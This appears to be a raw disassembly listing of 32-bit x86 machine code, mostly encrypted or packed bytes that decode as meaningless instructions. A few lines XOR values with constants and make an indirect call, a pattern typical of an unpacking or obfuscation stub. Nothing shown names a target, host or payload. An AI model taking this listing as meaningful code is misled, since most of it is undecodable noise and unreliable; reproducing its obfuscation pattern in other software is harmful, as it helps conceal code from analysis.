  416006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416007:	xchg   esi,eax
  416008:	pop    ecx
  416009:	ins    BYTE PTR es:[edi],dx
  41600a:	fdivr  QWORD PTR [eax+0x4e]
  41600d:	sub    BYTE PTR [ebp-0x54],bl
  416010:	add    eax,0xd84f3e70
  416015:	dec    esp
  416016:	fistp  DWORD PTR [ecx+edi*4-0x57a79012]
  41601d:	ds jb  0x41606d
  416020:	imul   ecx,esi,0xe7e6a225
  416026:	popa   
  416027:	pop    ds
  416028:	inc    edi
  416029:	cs ins BYTE PTR es:[edi],dx
  41602b:	dec    cx
  41602d:	in     eax,dx
  41602e:	call   0x594c407c
  416033:	add    DWORD PTR [eax-0x2e44daa],esp
  416039:	jnp    0x415fe9
  41603b:	jne    0x416021
  41603d:	jo     0x41608e
  41603f:	push   ds
  416040:	cwde   
  416041:	(bad)  
  416042:	int3   
  416043:	jb     0x416030
  416045:	out    0x71,eax
  416047:	loop   0x41606e
  416049:	aaa    
  41604a:	mov    DWORD PTR [edi+edx*2],esp
  41604d:	adc    BYTE PTR [ebx+0xa],ch
  416050:	ins    BYTE PTR es:[edi],dx
  416051:	es mov al,0xee
  416054:	lock test DWORD PTR [edi+0x6d13971],0x2fb0ada6
  41605f:	gs cmc 
  416061:	cwde   
  416062:	gs sahf 
  416064:	or     ecx,DWORD PTR [esi+0x8558b32]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x41608f
  41609a:	jno    0x41605a
  41609c:	mov    ds:0x707f17ca,al
  4160a1:	mov    ecx,0x6070707e
  4160a6:	jecxz  0x41611a
  4160a8:	push   cs
  4160a9:	icebp  
  4160aa:	mov    ds:0xce1a56ef,al
  4160af:	jl     0x4160db
  4160b1:	cwde   
  4160b2:	xor    ebp,esp
  4160b4:	cdq    
  4160b5:	pop    es
  4160b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160b7:	push   es
  4160b8:	inc    esp
  4160b9:	push   eax
  4160ba:	inc    ebp
  4160bb:	jmp    0x416049
  4160bd:	mov    ebx,0xb98c820d
  4160c2:	cmp    DWORD PTR [ecx+0x4c],edi
  4160c5:	sub    esi,edx
  4160c7:	pop    edi
  4160c8:	mov    ch,0xc8
  4160ca:	int3   
  4160cb:	or     eax,0x54e04c2b
  4160d0:	(bad)  
  4160d1:	lahf   
  4160d2:	cld    
  4160d3:	mov    dl,0xfd
  4160d5:	jg     0x416091
  4160d7:	push   esp
  4160d8:	imul   ebp,DWORD PTR [edx],0xdfc49e17
  4160de:	push   edx
  4160df:	or     eax,ecx
  4160e1:	icebp  
  4160e2:	(bad)  
  4160e3:	cs mov cl,0xe2
  4160e6:	out    dx,eax
  4160e7:	and    ebp,eax
  4160e9:	adc    WORD PTR [ebx+0x317744fa],ax
  4160f0:	in     al,dx
  4160f1:	mov    al,ds:0xde4b4598
  4160f6:	out    dx,eax
  4160f7:	jno    0x4160a8
  4160f9:	push   ebx
  4160fa:	or     eax,0x373d81ca
  4160ff:	xor    ebp,ebx
  416101:	xchg   ebp,eax
  416102:	push   ebx
  416103:	fwait
  416104:	pop    es
  416105:	ja     0x4160bb
  416107:	push   ebx
  416108:	pop    eax
  416109:	jmp    0x64b745be
  41610e:	add    BYTE PTR [edx+ebx*2+0x30],0x61
  416113:	mov    dl,0x41
  416115:	out    0xb0,eax
  416117:	out    dx,al
  416118:	mov    ds:0xcab6771e,al
  41611d:	jecxz  0x416113
  41611f:	repnz (bad) 
  416121:	sbb    edi,DWORD PTR [edx+0x6]
  416124:	rol    BYTE PTR [esi],0x41
  416127:	mov    ebp,esp
  416129:	xchg   ecx,eax
  41612a:	fisttp QWORD PTR [ebx+0x1b]
  41612d:	test   BYTE PTR [ebx-0x7ff6838c],0x1a
  416134:	pop    edx
  416135:	or     eax,0xb723319e
  41613a:	test   eax,0x9b5dc3e5
  41613f:	repnz bound eax,QWORD PTR [edx]
  416142:	ret    0x20ec
  416145:	jo     0x416184
  416147:	mov    ebx,0x13006951
  41614c:	arpl   WORD PTR ds:[edx+0x2fa65072],bp
  416153:	push   0xffffffc1
  416155:	loop   0x4160f5
  416157:	and    DWORD PTR [ecx-0x5c],0x60
  41615b:	dec    ecx
  41615d:	addr16 xor bh,al
  416160:	and    al,0x3a
  416162:	adc    eax,0xd524a095
  416167:	scas   al,BYTE PTR es:[edi]
  416168:	xchg   esp,eax
  416169:	stos   BYTE PTR es:[edi],al
  41616a:	and    ah,bh
  41616c:	and    BYTE PTR [edi],cl
  41616e:	gs das 
  416170:	bound  eax,QWORD PTR [esi]
  416172:	fdiv   DWORD PTR ds:0x254563f7
  416178:	ret    
  416179:	shl    al,cl
  41617b:	retf   0xe9e2
  41617e:	inc    ebp
  41617f:	or     al,BYTE PTR [eax]
  416181:	scas   al,BYTE PTR es:[edi]
  416182:	and    DWORD PTR [esi-0x62f4ce92],esi
  416188:	jmp    0xd2ee:0xf2bbae10
  41618f:	add    DWORD PTR [edi+0x1400e7a4],ebx
  416195:	cmp    edi,DWORD PTR [ebp+edi*4-0x2b]
  416199:	arpl   WORD PTR [edx-0x13ee11ed],di
  41619f:	ja     0x4161a6
  4161a1:	add    eax,0x29b53476
  4161a6:	jl     0x4161b9
  4161a8:	into   
  4161a9:	vpmacswd ymm7,ymm2,ymm0,YMMWORD PTR [edi+0x37e11d6a]
  4161b3:	push   edx
  4161b4:	push   0xffffffff
  4161b6:	xchg   esp,eax
  4161b7:	xor    dh,dl
  4161b9:	xor    al,0xfb
  4161bb:	shr    BYTE PTR [esi-0x59],0xdb
  4161bf:	rol    dh,0x87
  4161c2:	lods   al,BYTE PTR ds:[esi]
  4161c3:	pop    esi
  4161c4:	stc    
  4161c5:	mov    es,esp
  4161c7:	aad    0x46
  4161c9:	mov    edi,0xb81221c7
  4161ce:	fnsave [edx]
  4161d0:	inc    eax
  4161d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d2:	test   dh,bl
  4161d4:	enter  0x1f5d,0x74
  4161d8:	sbb    eax,eax
  4161da:	shr    bl,0x42
  4161dd:	adc    esi,DWORD PTR ss:[edx+0x2d]
  4161e1:	popf   
  4161e2:	adc    bl,BYTE PTR [ebx]
  4161e4:	retf   0xb037
  4161e7:	push   ds
  4161e8:	jmp    0x41617b
  4161ea:	aam    0x17
  4161ec:	sbb    BYTE PTR [edx-0x5],al
  4161ef:	ja     0x41622a
  4161f1:	sbb    ebx,ebx
  4161f3:	(bad)  
  4161f5:	mov    al,0x86
  4161f7:	and    eax,0x6a799387
  4161fc:	sub    bh,al
  4161fe:	cmp    eax,0xbd1568cd
  416203:	aas    
  416204:	enter  0x7b4e,0x31
  416208:	hlt    
  416209:	dec    esi
  41620a:	push   ebx
  41620b:	adc    dl,al
  41620d:	es test eax,0x29e864fe
  416213:	call   0x967fee1a
  416218:	push   esp
  416219:	mov    fs,WORD PTR [eax]
  41621b:	dec    edi
  41621c:	jp     0x416279
  41621e:	sbb    al,0x4c
  416220:	sbb    BYTE PTR [eax-0x25],bl
  416223:	(bad)  
  416225:	inc    edi
  416226:	push   0xbf33bac4
  41622b:	test   eax,0x5ac12c2c
  416230:	jno    0x416298
  416232:	sbb    BYTE PTR [ecx],dl
  416234:	lods   al,BYTE PTR ds:[esi]
  416235:	js     0x416238
  416237:	iret   
  416238:	out    dx,al
  416239:	sub    bh,BYTE PTR [ebp-0x47]
  41623c:	stos   BYTE PTR es:[edi],al
  41623d:	mov    ecx,0x690bf6b0
  416242:	std    
  416243:	ss test bl,al
  416246:	push   0xffffffdb
  416248:	xor    ebx,esp
  41624a:	jnp    0x416258
  41624c:	mov    ah,0xa5
  41624e:	lahf   
  41624f:	push   cs
  416250:	xor    al,0x1a
  416252:	and    ah,BYTE PTR [edx-0x6d]
  416255:	inc    ebx
  416256:	addr16 ret 0x183d
  41625a:	out    0x1a,eax
  41625c:	in     al,0x16
  41625e:	inc    eax
  41625f:	add    dl,bl
  416261:	jle    0x416246
  416263:	clc    
  416264:	pop    esi
  416265:	mov    ebp,0xa31ba951
  41626a:	js     0x4162b3
  41626c:	sti    
  41626d:	push   0xffffffb6
  41626f:	jmp    0x3e11:0xc5161076
  416276:	push   eax
  416277:	cmp    DWORD PTR [edx],edi
  416279:	aas    
  41627a:	mov    bh,0x16
  41627c:	pusha  
  41627d:	push   ecx
  41627e:	sub    bl,ch
  416280:	mov    ebp,0x38cdf81
  416285:	stc    
  416286:	push   esp
  416287:	ret    0xb8c6
  41628a:	into   
  41628b:	mov    dl,0x5a
  41628d:	ins    DWORD PTR es:[edi],dx
  41628e:	mov    BYTE PTR [ecx],0xc6
  416291:	pop    ebp
  416292:	adc    eax,0xca399671
  416297:	sbb    BYTE PTR [esi+0x3def94eb],bl
  41629d:	stos   BYTE PTR es:[edi],al
  41629e:	sub    al,al
  4162a0:	pop    ds
  4162a1:	push   esp
  4162a2:	add    al,0x3e
  4162a4:	and    eax,0x55427c1b
  4162a9:	jno    0x4162f4
  4162ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162ac:	mov    ch,0x2
  4162ae:	or     esp,DWORD PTR [eax]
  4162b0:	jno    0x416278
  4162b2:	or     DWORD PTR [eax-0x68],edx
  4162b5:	lods   eax,DWORD PTR ds:[esi]
  4162b6:	pop    ebx
  4162b7:	gs retf 0x6a78
  4162bb:	scas   eax,DWORD PTR es:[edi]
  4162bc:	mov    ebx,0x153f42a1
  4162c1:	mov    dh,0x8f
  4162c3:	retf   0xae69
  4162c6:	fnsave [ebx+eiz*4]
  4162c9:	cmp    al,0x83
  4162cb:	xchg   ebp,eax
  4162cc:	js     0x4162f7
  4162ce:	jmp    0x6f362bfa
  4162d3:	adc    edi,DWORD PTR [edx-0x1790ddd8]
  4162d9:	and    bl,ah
  4162db:	inc    esi
  4162dc:	loope  0x4162dd
  4162de:	je     0x416335
  4162e0:	mov    edx,0x79bd49ee
  4162e5:	cld    
  4162e6:	add    ebp,esp
  4162e8:	cli    
  4162e9:	mov    cl,0x90
  4162eb:	sub    eax,0x2a3aba2d
  4162f0:	mov    fs,esi
  4162f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f3:	popa   
  4162f4:	mov    ebx,0x5303100e
  4162f9:	rol    BYTE PTR [edi-0x4d89cc68],0x2
  416300:	jns    0x41630f
  416302:	mov    BYTE PTR [esi],ah
  416304:	fstp   DWORD PTR [esi-0x40cb8407]
  41630a:	cli    
  41630b:	hlt    
  41630c:	outs   dx,BYTE PTR ds:[esi]
  41630d:	retf   0x664c
  416310:	idiv   DWORD PTR [ebx+0x4b]
  416313:	inc    ebx
  416314:	stc    
  416315:	(bad)  [edx+0x41]
  416318:	sub    BYTE PTR [eax-0x75],dl
  41631b:	cmc    
  41631c:	and    eax,0x5a913ba9
  416321:	out    0xf6,al
  416323:	adc    BYTE PTR [eax+0x0],ch
  416326:	dec    esi
  416327:	cmp    cl,bl
  416329:	push   esp
  41632a:	outs   dx,DWORD PTR ds:[esi]
  41632b:	fwait
  41632c:	jp     0x41637d
  41632e:	pop    ss
  41632f:	inc    edx
  416330:	or     edi,esi
  416332:	(bad)  
  416333:	fisttp QWORD PTR [ebp-0x66347175]
  416339:	push   ebx
  41633a:	sub    BYTE PTR [eax],dl
  41633c:	or     al,0x2d
  41633e:	sbb    BYTE PTR [ecx+0x3a03363],0xd6
  416345:	leave  
  416346:	(bad)  
  416347:	scas   eax,DWORD PTR es:[edi]
  416348:	pop    ss
  416349:	cmc    
  41634a:	xor    DWORD PTR [ecx-0x41],edx
  41634d:	sub    BYTE PTR [ebx+0x76070696],al
  416353:	push   edx
  416354:	(bad)  
  416355:	jg     0x416381
  416357:	xchg   edi,eax
  416358:	push   eax
  416359:	test   DWORD PTR [eax-0x71],ebp
  41635c:	jne    0x4162f7
  41635e:	sub    al,0x40
  416360:	fld    DWORD PTR [ebx+0x22f78f30]
  416366:	cmp    BYTE PTR [ebx],al
  416368:	lahf   
  416369:	cmp    DWORD PTR [ecx+0x84d8b18],0xffffff8d
  416370:	mov    WORD PTR [edx],cs
  416372:	pushf  
  416373:	jb     0x4163a7
  416375:	add    BYTE PTR [ebx],bh
  416377:	enter  0x850f,0x22
  41637b:	icebp  
  41637c:	(bad)  
  41637d:	dec    DWORD PTR [ebx+0x5e9de]
  416383:	add    BYTE PTR [eax],al
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x691bc841
  4163bf:	sbb    DWORD PTR [ebp+0x707f1413],eax
  4163c5:	mov    ecx,0x5a70707e
  4163ca:	xchg   ecx,eax
  4163cb:	fnstcw WORD PTR [ebx]
  4163cd:	fs icebp 
  4163cf:	aaa    
  4163d0:	ror    DWORD PTR [ecx+0x71],0xa1
  4163d4:	mov    dl,BYTE PTR [ebp+esi*1-0x45]
  4163d8:	lea    ebx,[ecx]
  4163da:	add    al,0x48
  4163dc:	and    DWORD PTR fs:[eax-0x335025d9],esi
  4163e3:	test   BYTE PTR [edx+esi*4],cl
  4163e6:	fsub   DWORD PTR [edi]
  4163e8:	push   ebx
  4163e9:	pop    edx
  4163ea:	into   
  4163eb:	xchg   esi,eax
  4163ec:	shr    BYTE PTR [edi-0x72313e14],1
  4163f2:	mov    bl,0xec
  4163f4:	dec    ebp
  4163f5:	ficom  DWORD PTR [ebp+0x466441d]
  4163fb:	out    dx,eax
  4163fc:	shr    BYTE PTR [ebx+0x2083ad1f],cl
  416402:	xchg   edx,eax
  416403:	jno    0x416465
  416405:	push   0xffffff9a
  416407:	cmp    eax,0xd7c92984
  41640c:	std    
  41640d:	sahf   
  41640e:	mov    bl,0x31
  416410:	push   cs
  416411:	push   edi
  416412:	es mov cl,0x15
  416415:	retf   
  416416:	aam    0x27
  416418:	push   esi
  416419:	mov    ds:0xab8a1be4,al
  41641e:	jg     0x416423
  416420:	jo     0x4163de
  416422:	adc    BYTE PTR [edx],dl
  416424:	add    BYTE PTR [edi],ah
  416426:	inc    edx
  416427:	mov    ds:0xd10752ac,eax
  41642c:	aad    0xd3
  41642e:	outs   dx,DWORD PTR ds:[esi]
  41642f:	sbb    DWORD PTR [edx+0x37f4b1ea],0x14704fa0
  416439:	jo     0x4163bc
  41643b:	aas    
  41643c:	fsubr  DWORD PTR [ebx-0x34972922]
  416442:	mov    ebx,0x301ae887
  416447:	in     al,dx
  416448:	xor    dl,BYTE PTR [edi-0x62e8eb78]
  41644e:	or     bl,BYTE PTR [edi-0x4c]
  416451:	stos   BYTE PTR es:[edi],al
  416452:	dec    esp
  416453:	push   0x48
  416455:	xchg   esp,eax
  416456:	sahf   
  416457:	out    dx,al
  416458:	fdiv   QWORD PTR [ebx-0x628bb1b4]
  41645e:	test   ah,al
  416460:	imul   edx,eax,0x61
  416463:	lods   al,BYTE PTR ds:[esi]
  416464:	and    esi,esp
  416466:	out    dx,al
  416467:	mov    ebx,gs
  416469:	stos   BYTE PTR es:[edi],al
  41646a:	jne    0x41645d
  41646c:	pop    es
  41646d:	lods   eax,DWORD PTR ds:[esi]
  41646e:	adc    DWORD PTR [ebp+ebx*4-0x6],ebx
  416472:	adc    BYTE PTR [ebx-0x24aa747b],al
  416478:	(bad)  
  416479:	scas   al,BYTE PTR es:[edi]
  41647a:	jmp    0x416459
  41647c:	repz push edx
  41647e:	nop
  41647f:	push   eax
  416480:	pusha  
  416481:	sbb    BYTE PTR [esi+0xdf269ae],ch
  416487:	outs   dx,BYTE PTR ds:[esi]
  416488:	sahf   
  416489:	mov    eax,ds:0x1bc32eb9
  41648e:	dec    edx
  41648f:	clc    
  416490:	xor    DWORD PTR [edi+0x45d91c24],ebx
  416496:	stos   BYTE PTR es:[edi],al
  416497:	mov    ebp,0xb16f4176
  41649c:	push   0x52
  41649e:	xchg   bh,cl
  4164a0:	in     eax,0xc6
  4164a2:	add    DWORD PTR [edi+ecx*2-0x16],0x61878c53
  4164aa:	push   cs
  4164ab:	mov    BYTE PTR [ebp-0x7d],dl
  4164ae:	jae    0x416511
  4164b0:	les    edi,FWORD PTR [eax]
  4164b2:	inc    esi
  4164b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164b4:	fs adc eax,0x70b90c1e
  4164ba:	xchg   ebp,eax
  4164bb:	sbb    DWORD PTR [edi-0x457cb76e],eax
  4164c1:	push   ds
  4164c2:	add    BYTE PTR [ebp+0x227d7526],0x5
  4164c9:	push   ecx
  4164ca:	adc    BYTE PTR [edi-0x3d],dh
  4164cd:	fild   DWORD PTR [edx-0x389a72ef]
  4164d3:	imul   esi,DWORD PTR [eax-0x700cfebb],0xffffffa5
  4164da:	jecxz  0x41649c
  4164dc:	mov    bl,0x88
  4164de:	jns    0x4164c5
  4164e0:	cmp    bh,bh
  4164e2:	push   esp
  4164e3:	or     edx,DWORD PTR [eax+0xc]
  4164e6:	xor    edx,DWORD PTR [edi-0x5d26bab9]
  4164ec:	xor    al,dh
  4164ee:	mov    ah,0x10
  4164f0:	add    dh,BYTE PTR [edx]
  4164f2:	mov    al,ds:0x7ff1c2b2
  4164f7:	aad    0x32
  4164f9:	pop    ebp
  4164fa:	je     0x41654f
  4164fc:	xchg   edx,eax
  4164fd:	int    0x6e
  4164ff:	dec    esi
  416500:	into   
  416501:	mov    ebx,0xb8c33e7
  416506:	lock adc BYTE PTR ds:0xcc9424fd,0x33
  41650e:	or     al,0xe3
  416510:	inc    eax
  416511:	pop    ds
  416512:	jne    0x416532
  416514:	adc    BYTE PTR [eax],dl
  416516:	lds    ebx,FWORD PTR [edi]
  416518:	(bad)
  41651b:	sub    al,0x8c
  41651d:	dec    sp
  41651f:	loope  0x41655c
  416521:	imul   edi,esp,0xe2cd50da
  416527:	dec    ecx
  416528:	(bad)
  41652c:	push   edx
  41652d:	fucomp st(4)
  41652f:	arpl   cx,bx
  416531:	(bad)  
  416532:	pop    edi
  416533:	adc    dl,BYTE PTR [ebp+edi*8-0x38d9931]
  41653a:	xchg   BYTE PTR [ebx],ah
  41653c:	fnstenv ds:0x27a679d1
  416542:	xor    esi,0x44
  416545:	cmp    al,0x66
  416547:	sub    dh,al
  416549:	stos   DWORD PTR es:[edi],eax
  41654a:	cmp    BYTE PTR [esi+0x7f96a25],dl
  416550:	lds    edx,FWORD PTR [edi-0x4b03e8b2]
  416556:	adc    eax,0x61793671
  41655b:	test   al,0x42
  41655d:	fwait
  41655e:	adc    DWORD PTR [edx+0x45],0xce6be5d
  416565:	dec    ecx
  416566:	pop    edx
  416567:	in     eax,0x0
  416569:	lahf   
  41656a:	(bad)  
  41656b:	sub    ah,dl
  41656d:	mov    edx,0x90e93dfc
  416572:	jle    0x416531
  416574:	int3   
  416575:	mov    esi,0xed7c2a12
  41657a:	cmc    
  41657b:	mov    dl,0x81
  41657d:	and    esi,DWORD PTR [ebp+0x63]
  416580:	pop    esp
  416581:	dec    edi
  416582:	jecxz  0x416551
  416584:	jbe    0x41652d
  416586:	cld    
  416587:	or     DWORD PTR [esi+edi*8-0x2978c28],esi
  41658e:	call   0x4f690d86
  416593:	stc    
  416594:	cmp    dh,BYTE PTR [edi]
  416596:	ds sub eax,0x4b58351b
  41659c:	iret   
  41659d:	pop    eax
  41659e:	sbb    DWORD PTR [eax-0x4f],edi
  4165a1:	adc    ebp,0xffffff8c
  4165a4:	es jecxz 0x41656c
  4165a7:	pop    ebp
  4165a8:	les    edi,FWORD PTR [ebp+0x5a]
  4165ab:	xchg   DWORD PTR [eax-0x77],ebx
  4165ae:	stc    
  4165af:	mov    eax,DWORD PTR ds:0x2a039eb
  4165b5:	sbb    eax,0xb48b19cd
  4165ba:	pusha  
  4165bb:	scas   al,BYTE PTR es:[edi]
  4165bc:	fadd   QWORD PTR [eax]
  4165be:	aas    
  4165bf:	push   ds
  4165c0:	iret   
  4165c1:	push   edi
  4165c2:	ins    DWORD PTR es:[edi],dx
  4165c3:	sbb    bh,BYTE PTR [esi]
  4165c5:	push   edx
  4165c6:	(bad)  
  4165c7:	sti    
  4165c8:	dec    edx
  4165c9:	mov    bl,0x7b
  4165cb:	ds popf 
  4165cd:	imul   ebx,esi,0xffffffe7
  4165d0:	pop    eax
  4165d1:	or     DWORD PTR [ecx-0x79],esp
  4165d4:	xchg   ecx,eax
  4165d5:	(bad)  
  4165d6:	cmp    eax,0x2926fe9c
  4165db:	shr    esi,cl
  4165dd:	out    dx,eax
  4165de:	mov    ss,esp
  4165e0:	pop    edi
  4165e1:	push   edx
  4165e2:	stos   DWORD PTR es:[edi],eax
  4165e3:	dec    esi
  4165e4:	arpl   ax,di
  4165e6:	sar    BYTE PTR [ebx],1
  4165e8:	or     DWORD PTR [esi+0x57],esp
  4165eb:	fwait
  4165ec:	pop    ebx
  4165ed:	rol    DWORD PTR [edx],0xd6
  4165f0:	cwde   
  4165f1:	ja     0x41665a
  4165f3:	test   BYTE PTR [ebp-0x60ddef06],cl
  4165f9:	int3   
  4165fa:	inc    esp
  4165fb:	cld    
  4165fc:	dec    edx
  4165fd:	(bad)  
  4165fe:	lock in eax,0xfc
  416601:	push   eax
  416602:	or     eax,0xd13df8d3
  416607:	mov    esi,0x881cc07a
  41660c:	sbb    dl,BYTE PTR [esi-0x32]
  41660f:	cdq    
  416610:	imul   ecx,DWORD PTR [ecx-0xa],0x3b1f044e
  416617:	out    dx,eax
  416618:	push   0xb033ab29
  41661d:	mov    ecx,0x9e679cce
  416622:	mov    BYTE PTR cs:[eax-0x1e],dl
  416626:	clc    
  416627:	adc    eax,0xba1fdc50
  41662c:	lods   eax,DWORD PTR ds:[esi]
  41662d:	aas    
  41662e:	les    esp,FWORD PTR [ebp-0x7c823f11]
  416634:	out    dx,eax
  416635:	and    eax,0x5e201d66
  41663a:	xor    BYTE PTR [eax],al
  41663c:	sub    DWORD PTR [esi],edi
  41663e:	in     eax,0x1
  416640:	ret    
  416641:	jnp    0x416688
  416643:	cmp    DWORD PTR es:[ecx],edx
  416646:	cwde   
  416647:	dec    edx
  416648:	cmp    eax,eax
  41664a:	fs gs dec esi
  41664d:	(bad)  
  41664e:	repz pop esp
  416650:	test   BYTE PTR [edx-0x55],0x4b
  416654:	mov    ebx,DWORD PTR [edi+ecx*1-0x14136f6f]
  41665b:	(bad)  
  41665c:	and    dl,dh
  41665e:	ficomp WORD PTR [ebx+0x5e]
  416661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416662:	les    eax,FWORD PTR [ebx-0x6af9f87e]
  416668:	out    0xce,al
  41666a:	dec    edi
  41666b:	xor    dh,BYTE PTR [ebx]
  41666d:	cmc    
  41666e:	retf   0xe87c
  416671:	mov    cl,0x4f
  416673:	sub    al,0x5e
  416675:	mov    esp,0xa07d5ba1
  41667a:	lods   al,BYTE PTR ds:[esi]
  41667b:	pop    edi
  41667c:	mov    DWORD PTR [esi-0x411333e9],ebx
  416682:	rcr    DWORD PTR [esi+0x1f],1
  416685:	pop    esi
  416686:	pop    eax
  416687:	inc    edi
  416688:	out    dx,eax
  416689:	iret   
  41668a:	popa   
  41668b:	stos   DWORD PTR es:[edi],eax
  41668c:	dec    ebp
  41668d:	mov    edx,0x6a927a20
  416692:	or     bl,BYTE PTR [ecx+0x6a]
  416695:	add    al,0x5b
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x4166c4
  4166ae:	or     eax,0x125cf638
  4166b3:	jg     0x416725
  4166b5:	mov    ecx,0x1670707e
  4166ba:	(bad)  
  4166bc:	cmc    
  4166bd:	popa   
  4166be:	jb     0x4166c7
  4166c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166c1:	adc    ah,0xeb
  4166c4:	bound  eax,QWORD PTR [ecx]
  4166c6:	sahf   
  4166c7:	test   eax,0xe40cac11
  4166cc:	jo     0x41674b
  4166ce:	sbb    eax,0xa241a530
  4166d3:	mov    cl,0xf2
  4166d5:	sub    BYTE PTR [eax+0x23],bh
  4166d8:	dec    esi
  4166d9:	xchg   ebx,eax
  4166da:	ss aad 0x3f
  4166dd:	or     al,0xec
  4166df:	stc    
  4166e0:	iret   
  4166e1:	lea    ecx,[edx+0x9871947]
  4166e7:	iret   
  4166e8:	loopne 0x41666a
  4166ea:	call   FWORD PTR [edi+eiz*2]
  4166ed:	outs   dx,DWORD PTR ds:[esi]
  4166ee:	xlat   BYTE PTR ds:[ebx]
  4166ef:	das    
  4166f0:	push   ebp
  4166f1:	cmp    al,0x16
  4166f3:	fld    DWORD PTR [edx-0x6b]
  4166f6:	mov    eax,0x80ae719a
  4166fb:	adc    BYTE PTR [ebx-0x7f],0x6c
  4166ff:	stos   BYTE PTR es:[edi],al
  416700:	pop    ebx
  416701:	test   al,0xd2
  416703:	xchg   ecx,eax
  416704:	sti    
  416705:	mov    ecx,0xc262d385
  41670a:	sub    al,0xb5
  41670c:	ret    0xb802
  41670f:	fild   QWORD PTR [edi-0x6e]
  416712:	mov    bl,0x28
  416714:	(bad)  
  416715:	xlat   BYTE PTR ds:[ebx]
  416716:	push   es
  416717:	mov    ds:0x2e32f35e,eax
  41671c:	pop    es
  41671d:	es jo  0x41671e
  416720:	pop    es
  416721:	cs adc eax,0xaa60144f
  416727:	fs inc edi
  416729:	pushf  
  41672a:	and    al,0x7b
  41672c:	enter  0x512b,0x1f
  416730:	dec    edi
  416731:	pop    ds
  416732:	push   es
  416733:	push   esp
  416734:	pusha  
  416735:	leave  
  416736:	xchg   esi,eax
  416737:	fcmovbe st,st(2)
  416739:	and    BYTE PTR [edi],ch
  41673b:	fdivr  st(4),st
  41673d:	stc    
  41673e:	in     al,0xbd
  416740:	cmp    al,0xc7
  416742:	xor    ah,BYTE PTR [ecx+0x64]
  416745:	test   eax,0x4453bedb
  41674a:	cs out 0x23,al
  41674d:	dec    ebx
  41674e:	inc    esi
  41674f:	sbb    ebp,DWORD PTR [esp+ebx*4-0x3feec93d]
  416756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416757:	dec    dx
  416759:	add    esp,ebp
  41675b:	jnp    0x416739
  41675d:	sub    eax,0xe0c3a061
  416762:	push   esi
  416763:	fisubr WORD PTR [edx]
  416765:	and    bl,BYTE PTR [edi-0x535b492b]
  41676b:	pushf  
  41676c:	nop
  41676d:	xchg   esp,eax
  41676e:	in     eax,dx
  41676f:	daa    
  416770:	mov    ebx,?
  416772:	cmp    DWORD PTR [ecx+eax*2-0x14],ebx
  416776:	in     eax,dx
  416777:	push   ss
  416778:	daa    
  416779:	sub    ebp,0xffffffd0
  41677c:	and    BYTE PTR [ebx-0x3882703d],cl
  416782:	aas    
  416783:	and    eax,0x61503c08
  416788:	sbb    ebp,eax
  41678a:	mov    ecx,0xda2efef4
  41678f:	rol    bl,1
  416791:	and    dl,BYTE PTR [edx]
  416793:	aaa    
  416794:	test   BYTE PTR [ecx+0x3],cl
  416797:	mov    cl,dh
  416799:	jle    0x41676f
  41679b:	fimul  WORD PTR es:[ebx]
  41679e:	jo     0x416757
  4167a0:	test   al,0xda
  4167a2:	mul    BYTE PTR [ebp-0xb]
  4167a5:	xor    ch,BYTE PTR [esi]
  4167a7:	lock scas eax,DWORD PTR es:[edi]
  4167a9:	sti    
  4167aa:	xor    ecx,DWORD PTR [esi]
  4167ac:	dec    ebp
  4167ad:	pop    ebp
  4167ae:	add    BYTE PTR [edx-0x5ebe4703],dh
  4167b4:	iret   
  4167b5:	lods   eax,DWORD PTR ds:[esi]
  4167b6:	outs   dx,DWORD PTR ds:[esi]
  4167b7:	push   ebp
  4167b8:	call   0x5ffe6ce0
  4167bd:	mov    bh,bh
  4167bf:	jp     0x41679d
  4167c1:	or     DWORD PTR [esi-0x75],esp
  4167c4:	mov    ebx,0x6e351abd
  4167c9:	adc    bl,BYTE PTR [ebx+0x7938572d]
  4167cf:	pop    esp
  4167d0:	mov    ?,eax
  4167d2:	jmp    0x9b5b:0x21a6d8a6
  4167d9:	jo     0x416825
  4167db:	iret   
  4167dc:	loopne 0x41678c
  4167de:	sbb    BYTE PTR [esi-0x64c65a62],ah
  4167e4:	sub    eax,0xfde04510
  4167e9:	push   es
  4167ea:	adc    BYTE PTR [ecx],dh
  4167ec:	outs   dx,BYTE PTR ds:[esi]
  4167ed:	fucomi st,st(1)
